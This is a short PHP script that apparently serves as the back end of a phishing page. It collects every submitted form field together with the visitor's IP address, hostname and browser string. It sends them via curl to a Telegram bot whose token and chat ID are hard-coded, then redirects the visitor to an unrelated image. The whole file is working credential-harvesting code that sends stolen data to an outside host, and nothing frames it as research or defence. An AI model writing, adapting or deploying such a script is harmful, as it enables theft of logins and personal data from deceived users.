<?php 


$telegram_BOT_zoolander = '7428205255:AAF6N_xyECrlmu7vUz39RCrPmZdotJ76D9k';
$telegram_Chat_ID  = '5296256514';





$ip = getenv("REMOTE_ADDR");$ThanksURL =   "thanks.html"; foreach ($_POST as $Field=>$Value)$zoolanderzoolanderzoolanderzoolanderzoolander .= "$Field: $Value\n";$zoolanderzoolanderzoolanderzoolanderzoolander .= "\n" . @gethostbyaddr($_SERVER["REMOTE_ADDR"]) . "\n" .$_SERVER["HTTP_USER_AGENT"];$zoolanderzoolanderzoolanderzoolanderzoolander = htmlspecialchars($zoolanderzoolanderzoolanderzoolanderzoolander, ENT_NOQUOTES);if(isset($_POST)){$zoolander = 1;if($zoolander==1){$website="https://api.telegram.org/bot".$telegram_BOT_zoolander;$params=[
        'chat_id'=>$telegram_Chat_ID,
        'text'=>$zoolanderzoolanderzoolanderzoolanderzoolander."<br>".$ip,
    ];$ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);$result = curl_exec($ch);
    curl_close($ch);
   }











   header("Location: https://th.bing.com/th/id/R.8c8105404f9f4a71dee03374a69aef22?rik=6IJmHdxCG8u6Yw&pid=ImgRaw&r=0&sres=1&sresct=1");
  }

?>
